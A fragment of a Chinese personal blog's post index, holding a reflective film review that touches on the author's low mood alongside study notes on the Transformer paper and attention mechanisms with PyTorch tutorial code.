有那么一幕时小海獭们围坐在南河的放映机前，观看南河放映电影。有顽皮的小海獭举起双手，在屏幕中投影出小鸟或是小狗。也许在影视行业逐渐区域发达的今天，我们知道不会发生这样的事情，导致我们无法真正融入到这一场景中，误以为是前排观众的手挡住了画面，但这一幕无疑是温馨且童真的。导演试图使用这样的方式让我们意识到，我们也是观看这场梦，进入这场梦的人。 南河回忆自己的家乡时，参宿弥留在现实与梦境边缘时，必不可少的两样物件，就是一台放映机与一块幕布，而将我，这个现实中的观众夹在中间的，也正是一台放映机和一块幕布。 电影院也不过是这样一个梦境与现实的边缘，一边幕布上，是由人们创造的梦，而当我们回头看到的，是这场梦境的出口，一台放映机。就好像是盗梦空间中的陀螺，告诉我我正处在梦中，那边才是现实。 整部电影，也是一个我们的梦，这场梦从title亮起的那一刻便已经开始了，由水墨粒子构成的星空、鲸鱼、水母、飞鸟，是梦开始的讯号，结尾处的快醒醒、散场了宣告着这场梦的结束。 散场时，我久久不愿离去，想要回到那个梦中。 博弈 导演将参宿回到现实作为电影的结尾，是争议最大的部分。有人说双双赴死才是最好的结局，也有人说剧情稀烂不和逻辑，为了感人而感人。 我对自己的认知是一个同样有心结、同样过分懂事、同样不自信的人。最近也同样被这样的情绪困扰。但我没能遇到这么一个人，给我的生命带来一束光，可以持续给我带来善意，让我抓住这根绳努力往上爬。其实对我友善的人很多，但是我仍然没能从中解脱。我像一只蜗牛，在井壁上趴着，前进3米下滑2米。我知道我不应该要求有那么一个人来救赎我，我也知道只有当我自己愿意做出改变，自己愿意迈出那一步的适合，我才会发生改变。 这样的结局对我而言已经是最完美的了。参宿没有放弃生命，我也不会，因为我明白我的死会让身边的人难过。我希望从这样的状态中解脱，我希望获得温暖，希望对这个世界重新燃起激情。我希望这个世界至少有一面和我想象的一样美好。我希望看到我不是孤零零的一个人。 很多人会选择站在抑郁症患者的角度分析，认为这样的结局，参宿轻易的走出抑郁症，会让抑郁症患者感到不适。 我无权评论，因为我并没有符合医学条例的文件证明我也是抑郁症患者，我很喜欢这部电影。 参宿让我看到了我所面临的无助，并告诉我，世界上有像田导一样温柔细腻的灵魂，能够理解这样的心情。这大概是一部后劲非常足的电影。 也许我没有令人感动的故事让别人感同身受，以此来改变大家对这部电影的看法。但对我而言，这是一部温柔细腻，且美好的电影。是一场现实中的梦。 原来这个世界上也有和我一样，不愿意接受现实，依然在与它抗争的人。 关于设定 很多评论纠结的点在于，故事和设定并没有讲清楚。我像这些没有讲清楚的点在于，海精灵和丧气鬼的吧，我希望读完这篇文章，可以解开这些疑问，也许我已经尽力传达了这些，如果没办法和作者的脑洞搭上线就没办法理解的点转述为了直白的话语，但我更认为，对于梦，我们没必要纠结这么多，梦的意义在于逃避，在于休憩。 我渴望一个能让我感觉到这个世界充满善意的人。 在解读上，银屏系漫游指南比本文更清晰。","categories":[{"name":"Life","slug":"Life","permalink":"http://enderxiao.github.io/categories/Life/"},{"name":"电影","slug":"Life/电影","permalink":"http://enderxiao.github.io/categories/Life/%E7%94%B5%E5%BD%B1/"}],"tags":[{"name":"life","slug":"life","permalink":"http://enderxiao.github.io/tags/life/"},{"name":"movie","slug":"movie","permalink":"http://enderxiao.github.io/tags/movie/"}]},{"title":"CoMER实现与实验","slug":"CoMER实现与实验","date":"2023-02-07T06:12:34.000Z","updated":"2024-07-30T11:26:33.906Z","comments":true,"path":"2023/02/07/CoMER实现与实验/","permalink":"http://enderxiao.github.io/2023/02/07/CoMER%E5%AE%9E%E7%8E%B0%E4%B8%8E%E5%AE%9E%E9%AA%8C/","excerpt":"","text":"CoMER简介 该模块再Transformer的基础上引入了覆盖注意力机制，使得性能得到提升。 Transformer 多头注意力机制","categories":[{"name":"研究生","slug":"研究生","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/"},{"name":"科研","slug":"研究生/科研","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/%E7%A7%91%E7%A0%94/"},{"name":"OCR","slug":"研究生/科研/OCR","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/%E7%A7%91%E7%A0%94/OCR/"},{"name":"CoMER","slug":"研究生/科研/OCR/CoMER","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/%E7%A7%91%E7%A0%94/OCR/CoMER/"}],"tags":[{"name":"手写体识别","slug":"手写体识别","permalink":"http://enderxiao.github.io/tags/%E6%89%8B%E5%86%99%E4%BD%93%E8%AF%86%E5%88%AB/"},{"name":"深度神经网络","slug":"深度神经网络","permalink":"http://enderxiao.github.io/tags/%E6%B7%B1%E5%BA%A6%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C/"},{"name":"深度学习","slug":"深度学习","permalink":"http://enderxiao.github.io/tags/%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0/"},{"name":"注意力机制","slug":"注意力机制","permalink":"http://enderxiao.github.io/tags/%E6%B3%A8%E6%84%8F%E5%8A%9B%E6%9C%BA%E5%88%B6/"},{"name":"CoMER","slug":"CoMER","permalink":"http://enderxiao.github.io/tags/CoMER/"},{"name":"BaseLine","slug":"BaseLine","permalink":"http://enderxiao.github.io/tags/BaseLine/"}]},{"title":"Transformer论文阅读","slug":"Transformer论文阅读","date":"2022-12-14T07:12:55.000Z","updated":"2024-07-30T11:26:33.915Z","comments":true,"path":"2022/12/14/Transformer论文阅读/","permalink":"http://enderxiao.github.io/2022/12/14/Transformer%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/","excerpt":"Attention Is All You Need","text":"Attention Is All You Need 摘要 在主流的Seq2Seq模型中主要依赖于复杂的CNN或RNN,使用Encoder-Decoder架构连接起来,在这两个模块直接通常会使用一个注意力机制将其连接起来. 本文提出了更为简单的模型Transformer,该模型仅使用了注意力机制,并在机器翻译任务上取得了较好成绩. 该网络并行度更好,需要使用的时间训练更少 Intro 该部分描述了RNN现存的缺陷,即RNN中隐藏状态hth_tht​需要参考当前位置输入词ttt和上一个隐藏状态ht−1h_{t-1}ht−1​,因此在训练的过程中无法并行. 描述了注意力机制在Encoder-Decoder中编解码器中早已使用的事实. 相关工作 之前有人提出使用CNN来代替RNN减少时序计算,但CNN对于长序列难以建模,因为CNN每次只看一个小窗口(例如3*3卷积核),如果需要增大视野,则需要使用更深的卷积层,但使用注意力机制则每一次都能看到所以的序列. 另外CNN可以设置很多输出通道,每个通道代表了某种模态,因此该论文提出了Multi-Head Attention,可以模拟CNN多输出通道的效果. 模型 目前效果很好的编码器-解码器框架会通过编码器将输入序列(x1,...,xn)(x_1, ...,x_n)(x1​,...,xn​)表示为一个同样长度的新序列z=(z1,...,zn)z=(z_1,...,z_n)z=(z1​,...,zn​),然后解码器会用这一序列得到一个长为m的序列(y1,...,ym)(y_1,...,y_m)(y1​,...,ym​),即过去时刻的输出会作为当前时刻的输入,称之为自回归 编码器 编码器使用6个Transformer编码块堆叠而成,每个块包含两个子层: 为了残差连接的方便,每一个层的输出维度定位512 其中Norm使用的是Layer Normal,而不是CNN中常用的Batch Normal,两者最大的区别就是BN对每个feature做均值方差标准化,而LN对每个Batch做均值方差标准化. 因此BN层容易受到Batch_Size的影响 解码器 使用6个Transformer解码块堆叠而成,每个块包含三个子层: 由于在注意力机制中,注意力每次都需要看到完整的输入,而对于自回归解码器而言,解码器只能看到当前输入和上一些时刻的输出,因此此处使用Masked Multi-Head Attention来处理. 注意力 常见的注意力机制有两种: 加形注意力机制,可以处理query和key不等长的情况 点积注意力机制,与本文方法相同,除了除以dk\\sqrt{d_k}dk​​以外 注意力函数是一个将query和一些key-value对做映射成一个输出的函数,集体来说,输出output是value的加权和,因此output具有和value一样的维度. 每一个value的权重是其对应的key和query的相似度计算而来 而Transformer中采用的注意力机制为Scaled Dot-Product Attention,其中query和key是等长的假设为dkd_kdk​,value长度为dvd_vdv​ 计算时对key和query做内积,该直作为相似度量,也就是正交向量的相似度最小.计算完成后除以dk\\sqrt {d_k}dk​​即向量长度,然后用一个softmax得到权重,然后我们将权重作用到value上就能得到输出了. Attention(Q,K,V)=softmax(QKTdk)VAttention(Q,K,V) = softmax(\\frac{QK^T}{\\sqrt{d_k}})VAttention(Q,K,V)=softmax(dk​​QKT​)V 其中QKV均可不止一个,即均可为矩阵 本文在点积注意力机制的基础上除以dk\\sqrt {d_k}dk​​的目的是避免模型对长序列的倾向. 而带有掩码的Mask Multi-Head Attention就是当: t时刻的querytquery_tqueryt​计算时,只能考虑k1,...,kt−1k_1,...,k_{t-1}k1​,...,kt−1​因为当前时刻还没有之后的数据,但是注意力机制是所有数据同时输入的. 多头注意力 因此在带有掩码的多头注意力机制中,我们先计算出Q和K的矩阵乘法,并除以dk\\sqrt{d_k}dk​​然后对于querytquery_tqueryt​和kt−1k_{t-1}kt−1​之后的值换成一个非常大的负数,这样这么大的负数在softmax之后得到的用于与V相乘的权重将会趋近于0 本文还提出,与其只做一个单个的注意力函数,不如把QKV投影到低维,并投影h次然后再做h次的注意力函数,然后每一个函数的输出合并到一起,然后投影回来得到最终输出,即多头注意力机制表现如下: MultiHead(Q,K,V)=Concat(head1,head2,...,headh)WOMultiHead(Q,K,V) = Concat(head_1, head_2, ...,head_h)W^OMultiHead(Q,K,V)=Concat(head1​,head2​,...,headh​)WO where headi=Attention(QWiQ,KWiK,VWiV)where \\ head_i = Attention(QW^Q_i, KW^K_i, VW^V_i)where headi​=Attention(QWiQ​,KWiK​,VWiV​) 实际使用中用到的为8头注意力机制,投影维度为单注意力机制的输出维度/h FFN 该层即为全连接层的作用，只不过是对每一个词做MLP： FFN(x)=max(0,xW1+b1)W2+b2FFN(x) = max(0, xW_1+b_1)W_2 + b_2FFN(x)=max(0,xW1​+b1​)W2​+b2​ 其中W1W_1W1​会将512维度投影为1024维，W2W_2W2​则是将1024维投影回512 Embeddings 该层的目的在于对于一个词，学习一个长度为d的向量来表示这个词，本文d为512，transformer中编码器需要一个，解码器需要一个，最后softmax前的线性层也需要一个，文中三处的权重都是一样的，并且权重乘以d\\sqrt{d}d​,因为在Embedding学习的过程中会把L2范式学到过于小，那么维度越大，学习到的权重就会变小，但之后加上Positional Encoding时，其不会随着长度变长，因此需要保证其与Positional Encoding在一个尺度上。 Positional Encoding 由于注意力机制不会考虑语序的信息，因此需要手动的将语序信息加入输入。Transformer中使用cos、sin函数处理： PE(pos,2i)=sin(pos/100002i/dmodel)PE_{(pos,2i)}=sin(pos/10000^{2i/d_model})PE(pos,2i)​=sin(pos/100002i/dm​odel) PE(pos,2i+1)=cos(pos/100002i/dmodel)PE_{(pos,2i+1)}=cos(pos/10000^{2i/d_model})PE(pos,2i+1)​=cos(pos/100002i/dm​odel) 结论 该论文将所有循环层都替换为了多头自注意力层,使得模型具有了更好的并行性,使得该方法训练时间更短","categories":[{"name":"研究生","slug":"研究生","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/"},{"name":"论文","slug":"研究生/论文","permalink":"http://enderxiao.github.io/categories/%E7%A0%94%E7%A9%B6%E7%94%9F/%E8%AE%BA%E6%96%87/"},{"name":"Transformer","slug":"Transformer","permalink":"http://enderxiao.github.io/categories/Transformer/"}],"tags":[{"name":"CV","slug":"CV","permalink":"http://enderxiao.github.io/tags/CV/"},{"name":"图像处理","slug":"图像处理","permalink":"http://enderxiao.github.io/tags/%E5%9B%BE%E5%83%8F%E5%A4%84%E7%90%86/"},{"name":"论文笔记","slug":"论文笔记","permalink":"http://enderxiao.github.io/tags/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0/"},{"name":"Transformer","slug":"Transformer","permalink":"http://enderxiao.github.io/tags/Transformer/"},{"name":"端到端","slug":"端到端","permalink":"http://enderxiao.github.io/tags/%E7%AB%AF%E5%88%B0%E7%AB%AF/"}]},{"title":"动手学深度学习-RNN-Transformer","slug":"动手学深度学习-RNN-Transformer","date":"2022-12-14T03:12:39.000Z","updated":"2024-07-30T11:26:33.930Z","comments":true,"path":"2022/12/14/动手学深度学习-RNN-Transformer/","permalink":"http://enderxiao.github.io/2022/12/14/%E5%8A%A8%E6%89%8B%E5%AD%A6%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0-RNN-Transformer/","excerpt":"深度学习常用循环神经网络（RNN）与Transformer（纯注意力编码解码网络）","text":"深度学习常用循环神经网络（RNN）与Transformer（纯注意力编码解码网络） Transformer 架构 Transformer是基于编码器-解码器架构来处理序列对的 与带有注意力的seq2seq不同,Transformer是纯基于注意力的 多头注意力(Multi-head Attention) 实践过程中我们希望当给定相同的查询,键,值的时候,可以基于相同的注意力机制学习到不同的行为,然后将不同的行为作为知识组合起来,捕获序列内各种范围的依赖关系. 对于同一key,value,query,希望抽取不同的信息: 例如短距离关系和长距离关系 我们可以用独立学习得到的hhh组不同的*线性投影(linear projections)*来变换查询,键,值 多头注意力使用h个独立的注意力池化 合并各个头(head)输出得到最终输出 数学上我们可以用如下形式来表示多头注意力机制: 给定查询q∈Rdqq \\in R^{d_q}q∈Rdq​,键k∈Rdkk \\in R^{d_k}k∈Rdk​,值v∈Rdvv \\in R^{d_v}v∈Rdv​,每个注意力头hi(i=1,...,h)h_i(i=1,...,h)hi​(i=1,...,h)的计算方法为: hi=f(Wi(q)q,Wi(k)k,Wi(v)v)∈Rpvh_i = f(W_i^{(q)}q, W_i^{(k)}k, W_i^{(v)}v) \\in R^{p_v}hi​=f(Wi(q)​q,Wi(k)​k,Wi(v)​v)∈Rpv​ 其中Wi(q)∈Rpq×dq,Wi(k)∈Rpk×dk,Wi(v)∈Rpv×dvW_i^{(q)} \\in R^{p_q\\times d_q},W_i^{(k)} \\in R^{p_k \\times d_k}, W_i^{(v)} \\in R^{p_v \\times d_v}Wi(q)​∈Rpq​×dq​,Wi(k)​∈Rpk​×dk​,Wi(v)​∈Rpv​×dv​为需要学习的参数,以及代表注意力汇聚的函数f. f可以是加性注意力和缩放点积注意力 然后多头注意力的输出需要经过另一个线性转换,它对应着h个头连接后的结果,因此其可学习参数是Wo∈Rpo×hpvW_o \\in R^{p_o \\times hp_{v}}Wo​∈Rpo​×hpv​: Wo[h1...hh]∈RpoW_o \\left[ \\begin{matrix} h_1 \\\\ . \\\\ . \\\\ . \\\\ h_h \\end{matrix} \\right] \\in R^{p_o}Wo​⎣⎢⎢⎢⎢⎢⎡​h1​...hh​​⎦⎥⎥⎥⎥⎥⎤​∈Rpo​ 带有掩码的多头注意力 解码器对序列中一个元素输出时,不应该考虑该元素之后的元素,因此需要引入掩码来实现这一特性: 特就是计算xix_ixi​输出时,假装当前序列长度为i 基于位置的前馈网络(positionwise FFN) 事实上可以理解为一个全连接层 作用 将输入形状由(b,n,d)(b,n,d)(b,n,d)变换为(bn,d)(bn,d)(bn,d) 作用两个全连接层 输出形状由(bn,d)(bn,d)(bn,d)变化回(b,n,d)(b,n,d)(b,n,d) 等价于两层核窗口为1的一位卷积层 其中b表示batch size, n表示序列长度, d表示维度 层归一化(Add &amp; norm) 批量归一化是对每个特征/通道离元素进行归一化,但其不适合序列长度会变化的NLP任务 因此提出层归一化 层归一化对每个样本里的元素进行归一化 二者的区别如图所示: 对于一个Batch_size=b,feature_size=d,序列长度=len的一组数据,BN层的作法是将其在特征维度上进行归一化,而LN层则是在Batch维度上进行归一化,这样使得长度更稳定. 该层结构如图所示: 其中ADD即表示残差连接 信息传递 假设编码器中的输出y1,...,yny_1,...,y_ny1​,...,yn​,将其作为解码器中第i个Transformer块中Multi-head Attention中的key和value,它的query来自目标序列(即此处为非自注意力机制) 这意味着编码器和解码器中块的个数和输出维度都一样. 预测 预测第t+1t+1t+1个输出时,解码器中输入前t个预测值 在自注意力中,前t个预测值作为key和value,第t个预测值还作为query 总结 Transformer是一个纯使用注意力的编码-解码器 编码器和解码器都有n个transformer块 每个块中使用多头(自)注意力,基于位置的前馈网络,和层归一化 代码实验 先来实现Multi-Head attention 1234567891011121314151617181920212223242526272829303132333435363738class MultiHeadAttention(nn.Module): def __init__(self, key_size, query_size, value_size, num_hiddens, num_heads, dropout, bias=False, **kwargs): super(MultiHeadAttention, self).__init__(**kwargs) # TODO: 头数 self.num_heads = num_heads # TODO: 注意力层 self.attention = DotProductAttention(dropout) # TODO: 学习query, key value的投影矩阵(即线性层),以及 self.W_q = nn.Linear(query_size, num_hiddens, bias=bias) self.W_k = nn.Linear(key_size, num_hiddens, bias=bias) self.W_v = nn.Linear(value_size, num_hiddens, bias=bias) self.W_o = nn.Linear(num_hiddens, num_hiddens, bias=bias) def forward(self, queries, keys, values, valid_lens): # queries，keys，values的形状: # (batch_size，查询或者“键－值”对的个数，num_hiddens) # valid_lens 的形状: # (batch_size，)或(batch_size，查询的个数) # 经过变换后，输出的queries，keys，values 的形状: # (batch_size*num_heads，查询或者“键－值”对的个数， # num_hiddens/num_heads) queries = transpose_qkv(self.W_q(queries), self.num_heads) keys = transpose_qkv(self.W_k(keys), self.num_heads) values = transpose_qkv(self.W_v(values), self.num_heads) if valid_lens is not None: # 在轴0，将第一项（标量或者矢量）复制num_heads次， # 然后如此复制第二项，然后诸如此类。 valid_lens = torch.repeat_interleave( valid_lens, repeats=self.num_heads, dim=0) # output的形状:(batch_size*num_heads，查询的个数， # num_hiddens/num_heads) output = self.attention(queries, keys, values, valid_lens) # output_concat的形状:(batch_size，查询的个数，num_hiddens) output_concat = transpose_output(output, self.num_heads) return self.W_o(output_concat) 注意力机制 注意力机制是源于19世纪90年代威廉詹姆斯提出的*双组件（two-component）*框架，该研究展示了注意力是如何作用于视觉世界中的， 该框架中受试者于非自主性提示和自主性提示有选择性地引导注意力的焦点。 非自主性提示是基于环境中物体的突出性和易见性 例如我们有五件物品：报纸、论文、咖啡、笔记本、一本书 那么如果在这些物品中，数、笔记本、论文、报纸这些纸质品均为黑白印刷，而咖啡杯为醒目的红色，那么咖啡杯在这个环境中则是突出的、显眼的 所以我们会将视力最敏锐的地方放在咖啡上 自主性提示基于受试者的主观意愿推动，选择的力量也就更强大 喝完咖啡后我们变得兴奋，更想读书了，于是将注意力聚焦于书本。 这与之前提到的，由于突出性导致的注意咖啡不同，此次选择书本是收到了认识和意识的控制，因此注意力在基于自主性提示去辅助选择时将更为谨慎。 查询、键和值 那么如何利用上述两种注意力提示，用神经网络来设计注意力机制的框架。 非自主性提示 首先考虑只包含非自主性提示，那么想将选择偏向于感官输入，则可以简单地使用参数化的全连接层，甚至非参数化的MaxPooling和AvgPooling 自主性提示 在注意力机制的背景下，自主性提示被成为查询（query）。给定任何查询，注意力机制通过注意力汇聚（attention pooling）将选择引导至感官输入（sensory inputs， 例如中间特征表示） 而在注意力机制中，这些感官输入被成为值(value)，而每一个值都有一个与之对应的键(key) 键可以想象为感官输入的非自自主提示，可以通过设计注意力汇聚的方式， 便于给定的查询（自主性提示）与键（非自主性提示）进行匹配， 这将引导得出最匹配的值（感官输入）。 注意力可视化 平均汇聚层可以被视为输入的加权平均值， 其中各输入的权重是一样的。 实际上，注意力汇聚得到的是加权平均的总和值， 其中权重是在给定的查询和不同的键之间计算得出的。 12345678910111213141516171819202122232425262728import torchfrom d2l import torch as d2ldef show_heatmaps(matrices, xlabel, ylabel, titles=None, figsize=(2.5, 2.5), cmap=&#x27;Reds&#x27;): &quot;&quot;&quot;显示矩阵热图&quot;&quot;&quot; d2l.use_svg_display() num_rows, num_cols = matrices.shape[0], matrices.shape[1] fig, axes = d2l.plt.subplots( num_rows, num_cols, figsize=figsize, sharex=True, sharey=True, squeeze=False) for i, (row_axes, row_matrices) in enumerate(zip(axes, matrices)): for j, (ax, matrix) in enumerate(zip(row_axes, row_matrices)): pcm = ax.imshow(matrix.detach().numpy(), cmap=cmap) if i == num_rows - 1: ax.set_xlabel(xlabel) if j == 0: ax.set_ylabel(ylabel) if titles: ax.set_title(titles[j]) fig.colorbar(pcm, ax=axes, shrink=0.6)attention_weight = torch.eye(10).reshape((1, 1, 10, 10))show_heatmaps(attention_weight, xlabel=&#x27;Keys&#x27;, ylabel=&#x27;Queries&#x27;)d2l.plt.show() 如图所示的我们使用了一个简单的例子来显示query和key，本例中只有当query和key相同时，注意力权重为1，否则为0。 注意力汇聚实验：Nadaraya-Watson核回归 首先我们生成一个人工数据集，使用如下函数来生成：为： yi=2sin(xi)+xi0.8+ϵy_i = 2sin(x_i) + x_i^{0.8} + \\epsilonyi​=2sin(xi​)+xi0.8​+ϵ 12345678910n_train = 50 # 训练样本数x_train, _ = torch.sort(torch.rand(n_train) * 5) # 排序后的训练样本def f(x): return 2 * torch.sin(x) + x**0.8y_train = f(x_train) + torch.normal(0.0, 0.5, (n_train,)) # 训练样本的输出x_test = torch.arange(0, 5, 0.1) # 测试样本y_truth = f(x_test) # 测试样本的真实输出n_test = len(x_test) # 测试样本数 Nadaraya和Watson在很早之前就提出了一个想法，根据输入的位置对输出yiy_iyi​进行加权： f(x)=∑i=1nK(x−xi)∑j=1nK(x−xj)yif(x) = \\sum_{i=1}^n \\frac{K(x-x_i)}{\\sum_{j=1}^n K(x-x_j)}y_if(x)=∑i=1n​∑j=1n​K(x−xj​)K(x−xi​)​yi​ 其中K为核函数，如果我们从注意力机制的角度来重写上式，那我们可以得到一个注意力汇聚的通用形式： f(x)=∑i=1nα(x,xi)yif(x) = \\sum_{i=1}^n \\alpha (x, x_i)y_if(x)=∑i=1n​α(x,xi​)yi​ 其中xxx时查询，(xi,yi)(x_i,y_i)(xi​,yi​)时键值对，注意力汇聚则是yiy_iyi​的加权平均。xxx与xix_ixi​之间的关系建模为注意力权重。 非参数注意力汇聚 下面我们使用高斯核函数作为K来进行实验： K(u)=12πexp(−u22)K(u) = \\frac{1}{\\sqrt{2\\pi}}exp(-\\frac{u^2}{2})K(u)=2π​1​exp(−2u2​) 将其带入可得： $f(x) = \\sum_{i=1}{n}\\frac{exp(-\\frac{1}{2}(x-x_i)2)}{\\sum_{j=1}^n exp(-\\frac{1}{2} (x-x_i)^2)}y_i \\ = \\sum_{i=1}^n softmax(-\\frac{1}{2}(x-x_i)^2)y_i $ 12345678910# X_repeat的形状:(n_test,n_train),# 每一行都包含着相同的测试输入（例如：同样的查询）X_repeat = x_test.repeat_interleave(n_train).reshape((-1, n_train))# x_train包含着键。attention_weights的形状：(n_test,n_train),# 每一行都包含着要在给定的每个查询的值（y_train）之间分配的注意力权重attention_weights = nn.functional.softmax(-(X_repeat - x_train)**2 / 2, dim=1)# y_hat的每个元素都是值的加权平均值，其中的权重是注意力权重y_hat = torch.matmul(attention_weights, y_train)plot_kernel_reg(y_hat)d2l.plt.show() 得到拟合结果如下： 现在来观察注意力的权重。 这里测试数据的输入相当于查询，而训练数据的输入相当于键。 因为两个输入都是经过排序的，因此由观察可知“查询-键”对越接近， 注意力汇聚的注意力权重就越高。 带参数注意力汇聚 我们可以引入一些可学习的参数来使得我们的模型具有更好的泛化能力，例如对于高斯核函的注意力汇聚函数中，让距离乘以参数： $f(x) = \\sum_{i=1}^n softmax(-\\frac{1}{2}((x-x_i)w)^2)y_i $ 那么我们可以构建一个如下所示的模型： 1234567891011121314class NWKernelRegression(nn.Module): def __init__(self, **kwargs): super().__init__(**kwargs) self.w = nn.Parameter(torch.rand((1,), requires_grad=True)) def forward(self, queries, keys, values): # queries和attention_weights的形状为(查询个数，“键－值”对个数) queries = queries.repeat_interleave( keys.shape[1]).reshape((-1, keys.shape[1])) self.attention_weights = nn.functional.softmax( -((queries - keys) * self.w)**2 / 2, dim=1) # values的形状为(查询个数，“键－值”对个数) return torch.bmm(self.attention_weights.unsqueeze(1), values.unsqueeze(-1)).reshape(-1) 接下来我们可以对模型使用一些策略来训练，例如使用平方损失函数和随机梯度下降： 12345678910111213141516171819202122# X_tile的形状:(n_train，n_train)，每一行都包含着相同的训练输入X_tile = x_train.repeat((n_train, 1))# Y_tile的形状:(n_train，n_train)，每一行都包含着相同的训练输出Y_tile = y_train.repeat((n_train, 1))# keys的形状:(&#x27;n_train&#x27;，&#x27;n_train&#x27;-1)keys = X_tile[(1 - torch.eye(n_train)).type(torch.bool)].reshape((n_train, -1))# values的形状:(&#x27;n_train&#x27;，&#x27;n_train&#x27;-1)values = Y_tile[(1 - torch.eye(n_train)).type(torch.bool) ].reshape((n_train, -1))net = NWKernelRegression()loss = nn.MSELoss(reduction=&#x27;none&#x27;)trainer = torch.optim.SGD(net.parameters(), lr=0.5)animator = d2l.Animator(xlabel=&#x27;epoch&#x27;, ylabel=&#x27;loss&#x27;, xlim=[1, 5])for epoch in range(5): trainer.zero_grad() l = loss(net(x_train, keys, values), y_train) l.sum().backward() trainer.step() print(f&#x27;epoch &#123;epoch + 1&#125;, loss &#123;float(l.sum()):.6f&#125;&#x27;) animator.add(epoch + 1, float(l.sum())) 最终得到的拟合效果如下图所示： 接着来看一眼他的注意力权重： 与非参数的注意力汇聚模型相比， 带参数的模型加入可学习的参数后， 曲线在注意力权重较大的区域变得更不平滑。 自注意力与位置编码 自注意力 给定序列$x_1, …, x_n, \\forall x_i \\in R^d $ 子注意力池化层将xix_ixi​当作key，value，query来对序列抽取特征得到y1,...,yny_1,...,y_ny1​,...,yn​其中yi=f(xi,(x1,x1),...,(xn,xn))∈Rdy_i = f(x_i,(x_1,x_1),...,(x_n,x_n)) \\in R^dyi​=f(xi​,(x1​,x1​),...,(xn​,xn​))∈Rd 自注意力与CNN、RNN对比 CNN RNN 自注意力 计算复杂度 O(knd^2) O(nd^2) O(n^2d) 并行度 O(n) O(1) O(n) 最长路径 O(n/k) O(n) O(1) 接下来比较下面几个架构，目标都是将由n个词元组成的序列映射到另一个长度相等的序列，其中的每个输入词元或输出词元都由d维向量表示。具体来说，将比较的是卷积神经网络、循环神经网络和自注意力这几个架构的计算复杂性、顺序操作和最大路径长度。由于顺序操作会妨碍并行计算，而任意的序列位置组合之间的路径越短，则能更轻松地学习序列中的远距离依赖关系 如图所示卷积神经网络由于收到卷积核大小的限制，每个神经元都将看到小范围相邻的几个元素，而随着层数的增加，卷积神经网络的感受野就会更大。 使用卷积神经网络处理序列时，我们设置序列长度为n，输入和输出通道数均为d，因此卷积层的计算复杂度为O(knd2)O(knd^2)O(knd2) 卷积神经网络是分层的，因此为有O(1)个顺序操作， 最大路径长度为O(n/k)。 例如，x1和x5处于图中卷积核大小为3的双层卷积神经网络的感受野内。 当更新循环神经网络的隐状态时， d×d权重矩阵和d维隐状态的乘法计算复杂度为O(d2)O(d^2)O(d2)。 由于序列长度为n，因此循环神经网络层的计算复杂度为O(nd2)O(nd^2)O(nd2)。 根据 上图所示， 有O(n)个顺序操作无法并行化，最大路径长度也是O(n)。 在自注意力中，查询、键和值都是n×d矩阵。 考虑 使用缩放的点积注意力， 其中n×d矩阵乘以d×n矩阵。 之后输出的n×n矩阵乘以n×d矩阵。 因此，自注意力具有O(n2d)O(n^2d)O(n2d)计算复杂性。 正如图中所示， 每个词元都通过自注意力直接连接到任何其他词元。 因此，有O(1)个顺序操作可以并行计算， 最大路径长度也是O(1)。 因此，卷积神经网络和自注意力都拥有并行计算的优势， 而且自注意力的最大路径长度最短。 但是因为其计算复杂度是关于序列长度的二次方，所以在很长的序列中计算会非常慢。 代码实现 12345678910111213import mathimport torchfrom torch import nnfrom d2l import torch as d2lnum_hiddens, num_heads = 100, 5attention = d2l.MultiHeadAttention(num_hiddens, num_hiddens, num_hiddens, num_hiddens, num_heads, 0.5)print(attention.eval())batch_size, num_queries, valid_lens = 2, 4, torch.tensor([3, 2])X = torch.ones((batch_size, num_queries, num_hiddens))print(attention(X, X, X, valid_lens).shape) 位置编码 跟CNN/RNN不同，自注意力并没有记录位置信息 位置编码将位置信息注入到输入中 假设长度为n的序列是X∈Rn×dX \\in R^{n \\times d}X∈Rn×d，那么使用位置编码矩阵P∈Rn×dP \\in R^{n \\times d}P∈Rn×d来输出X+PX + PX+P作为自编码输入 P的元素如下计算： pi,2j=sin(i100002j/d),pi,2j+1=cos(i100002j/d)p_{i,2j} = sin(\\frac{i}{10000^{2j/d}}), p_{i,2j+1} = cos(\\frac{i}{10000^{2j/d}})pi,2j​=sin(100002j/di​),pi,2j+1​=cos(100002j/di​) 12345678910111213141516171819202122232425262728293031class PositionalEncoding(nn.Module): &quot;&quot;&quot;位置编码&quot;&quot;&quot; def __init__(self, num_hiddens, dropout, max_len=1000): super(PositionalEncoding, self).__init__() self.dropout = nn.Dropout(dropout) # 创建一个足够长的P self.P = torch.zeros((1, max_len, num_hiddens)) X = torch.arange(max_len, dtype=torch.float32).reshape( -1, 1) / torch.pow(10000, torch.arange( 0, num_hiddens, 2, dtype=torch.float32) / num_hiddens) self.P[:, :, 0::2] = torch.sin(X) self.P[:, :, 1::2] = torch.cos(X) def forward(self, X): X = X + self.P[:, :X.shape[1], :].to(X.device) return self.dropout(X) encoding_dim, num_steps = 32, 60pos_encoding = PositionalEncoding(encoding_dim, 0)pos_encoding.eval()X = pos_encoding(torch.zeros((1, num_steps, encoding_dim)))P = pos_encoding.P[:, :X.shape[1], :]d2l.plot(torch.arange(num_steps), P[0, :, 6:10].T, xlabel=&#x27;Row (position)&#x27;, figsize=(6, 2.5), legend=[&quot;Col %d&quot; % d for d in torch.arange(6, 10)])d2l.plt.show()P = P[0, :, :].unsqueeze(0).unsqueeze(0)d2l.show_heatmaps(P, xlabel=&#x27;Column (encoding dimension)&#x27;, ylabel=&#x27;Row (position)&#x27;, figsize=(3.5, 4), cmap=&#x27;Blues&#x27;)d2l.plt.show() 绝对位置信息 该位置编码的思路有点类似计算机中使用二进制编码表示数字的方法 123456780 in binary is 0001 in binary is 0012 in binary is 0103 in binary is 0114 in binary is 1005 in binary is 1016 in binary is 1107 in binary is 111 